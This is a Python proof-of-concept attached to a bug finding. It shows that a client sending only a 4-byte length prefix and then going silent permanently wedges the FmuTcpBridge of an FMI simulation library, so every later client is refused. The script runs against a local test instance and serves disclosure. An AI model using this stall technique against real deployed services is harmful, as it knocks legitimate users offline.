"""FINDING: one stalled frame wedges FmuTcpBridge for good.

`_serve_conn` does `conn.settimeout(None)` and then blocks in
`_recv_exact` until the announced body arrives.  It holds `self._busy`
the whole time, and `_busy` is what makes the bridge refuse a second
FMU instance.  A peer that sends a 4-byte length prefix and then stops
(a crashed importer, a dropped link, or an attacker) therefore parks
the bridge's only instance slot for ever: every later connection is
answered "bridge already serves an FMU instance" and nothing recovers
it short of restarting the sidecar process.
"""
import json, socket, struct, threading, time
from maddening.core.graph_manager import GraphManager
from maddening.fmi import build_model_description
from maddening.fmi.package import MODEL_IDENTIFIER
from maddening.fmi.sidecar import FmuSidecar, SidecarConfig
from maddening.fmi.tcp_bridge import FmuTcpBridge, recv_raw
from maddening.nodes.spring import SpringDamperNode

DT = 1e-2
gm = GraphManager(); gm.add_node(SpringDamperNode("spring", DT, stiffness=30.0)); gm.compile()
md = build_model_description(gm, model_name="P", model_identifier=MODEL_IDENTIFIER)
sc = FmuSidecar(SidecarConfig(schema_token=md.instantiation_token, step_fn=gm._compiled_step,
                              initial_state=gm._state, params=gm.params, param_specs=gm.param_specs()))
bridge = FmuTcpBridge(sc, md, master_dt=DT).start()
host, port = bridge.endpoint.split(":"); port = int(port)

def talk(tag, timeout=3.0):
    s = socket.create_connection((host, port), timeout=timeout); s.settimeout(timeout)
    b = json.dumps({"op": "hello"}).encode()
    s.sendall(struct.pack(">I", len(b)) + b)
    try:    got = recv_raw(s)
    except Exception as e: got = ("ERR", repr(e))
    s.close(); print(f"  {tag}: {got}"); return got

print("before the attack:"); talk("honest client")

print("\nattacker: 4-byte prefix announcing 100 bytes, body never sent, socket kept open")
atk = socket.create_connection((host, port))
atk.sendall(struct.pack(">I", 100))
while not bridge._busy.locked():          # wait for the accept loop to pick it up
    time.sleep(0.05)
print("  bridge._busy held by the stalled connection:", bridge._busy.locked())

print("\nfor the next 10 s every honest client is refused:")
t0 = time.time()
while time.time() - t0 < 10:
    talk(f"honest client t+{time.time()-t0:4.1f}s")
    time.sleep(3)
print("\nstill wedged:", bridge._busy.locked(),
      "| serving thread:", [t.name for t in threading.enumerate() if "_serve_conn" in t.name])
bridge.stop(); atk.close()
